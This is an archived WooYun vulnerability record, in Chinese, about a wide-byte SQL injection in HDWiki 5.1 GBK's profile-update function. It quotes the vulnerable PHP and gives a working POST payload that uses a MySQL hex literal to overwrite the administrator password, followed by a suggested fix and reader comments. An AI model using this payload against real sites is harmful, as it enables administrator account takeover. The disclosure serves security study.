{"id": 34070, "wybug_id": "wooyun-2015-098651", "wybug_title": "HDWIKI最新版Update注入可修改管理员密码（MYSQL进制技巧）", "wybug_corp": "互动在线（北京）科技有限公司", "wybug_author": "小飞", "wybug_date": "2015-02-27 22:45", "wybug_open_date": "2015-06-02 22:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向公众公开  简要描述： 最新版HDWIKI 5.1 GBK无视GPC上首页吧！ 详细说明：  问题出在\\hdwiki\\control\\user.php下最新版HDWIKI 5.1 GBK版本HDWIKI全局过滤，但是面对宽字节注入，就容易出问题了\nfunction doeditprofile(){\t\tif(isset($this->post['submit'])){\t\t\t$gender = intval($this->post['gender']);\t\t\t$birthday = strtotime($this->post['birthday']);\t\t\t$location = $this->post['location'];\t\t\t$signature = $this->post['signature'];\t\t\tif (WIKI_CHARSET == 'GBK'){\t\t\t\t$location = string::hiconv($location);\t\t\t\t$signature = string::hiconv($signature);\t\t\t}\t\t\t$location = htmlspecialchars($location);\t\t\t$signature = htmlspecialchars(str_replace(array('\\n','\\r'),'',$signature));\t\t\t\t\t\t$_ENV['user']->set_profile($gender,$birthday,$location,$signature,$this->user['uid']);\t\t}else{\t\t\tif(0 == $this->user['birthday']){\t\t\t\t$birthday = '';\t\t\t}else{\t\t\t\t$birthday=$this->setting['time_offset']*3600+$this->setting['time_diff']*60+$this->user['birthday'];\t\t\t\t$birthday = date('Y-m-d',$birthday);\t\t\t}\t\t\t$this->view->assign('birthday',$birthday);\t\t\t//$this->view->display('editprofile');\t\t\t$_ENV['block']->view('editprofile');\t\t}\t}\n关键代码是\n$location = string::hiconv($location);\t\t\t\t$signature = string::hiconv($signature);\t\t\t}\t\t\t$location = htmlspecialchars($location);\t\t\t$signature = htmlspecialchars(str_replace(array('\\n','\\r'),'',$signature));\nHDWIKI在大部分编码转换之后的地方都会addslashes这里我们跟进这个函数set_profile()\nfunction set_profile($gender,$birthday,$location,$signature,$uid){\t\t$this->db->query(\"UPDATE `\".DB_TABLEPRE.\"user` SET gender = '$gender',birthday = '$birthday',location = '$location',signature = '$signature' WHERE uid = $uid\");\n进入mysql前并没有进行addslashes而且我们有$location，$signature思路是让location引入\\注释后面的单引号 由signature来注入由于没有开display_error ,我们延时看看\n\n我们就能盲注查询管理员密码但是有时候密码是破不出来的，怎么办呢我们其实可以替换管理员密码先说说HDWKI的表构造由于管理员和普通的账号都存储在wiki_user下，所以这里由于是update的是这个表但是问题来了我们引入password的时候 格式一般都是\npassword='b5ebc89058e80ef0189090a0390109e4'\n但是这里是无法引入单引号的（会被addslashes），而不打单引号又会被当成表名，不被识别为value。这里用要一个小技巧MYSQL对十六进制是能够自动识别 转换的。比如\n\n这样我们就能绕过单引号而update管理员密码了我们先本地用脚本转换ascii为hex\n<?php echo bin2hex($_GET[a]);?>\n然后向http://localhost/hdwiki/index.php?user-editprofilepost\ngender=0&birthday=2015-02-18&location=%E9%8C%A6%27&signature=, password=0x3231323332663239376135376135613734333839346130653461383031666333#&submit=true\n成功修改密码\n\n   漏洞证明：  我们延时看看\n\n成功修改密码\n\n   修复方案：  set_profile函数里 查询前先addslashes   版权声明：转载请注明来源 小飞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-02 22:47 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-27 23:20 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  is_numeric?    \n     2015-02-27 23:21 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  @玉林嘎 不是 不过hdwiki is_numeric也有问题    \n     2015-06-02 22:52 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:251 漏洞数:30        )\t\t \n  技巧不错。感谢。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}